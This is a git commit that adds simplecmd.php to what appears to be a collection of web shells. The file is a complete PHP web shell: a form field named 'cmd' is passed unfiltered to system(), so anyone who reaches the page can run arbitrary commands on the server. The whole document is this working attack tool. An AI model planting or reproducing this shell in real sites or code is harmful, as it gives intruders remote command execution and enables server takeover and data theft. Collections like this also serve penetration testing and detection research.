1bf089d2643ed76f28c7ce380a58cd101209b3a8
Jean-Francois-C <61638766+Jean-Francois-C@users.noreply.github.com>
2021-12-19 04:15:58 +0100

    Create simplecmd.php

---
+++ webshells/fuzzdb-webshell/simplecmd.php
@@ -0,0 +1,13 @@
+<HTML><BODY>
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Send">
+</FORM>
+<pre>
+<?
+if($_GET['cmd']) {
+  system($_GET['cmd']);
+  }
+?>
+</pre>
+</BODY></HTML>
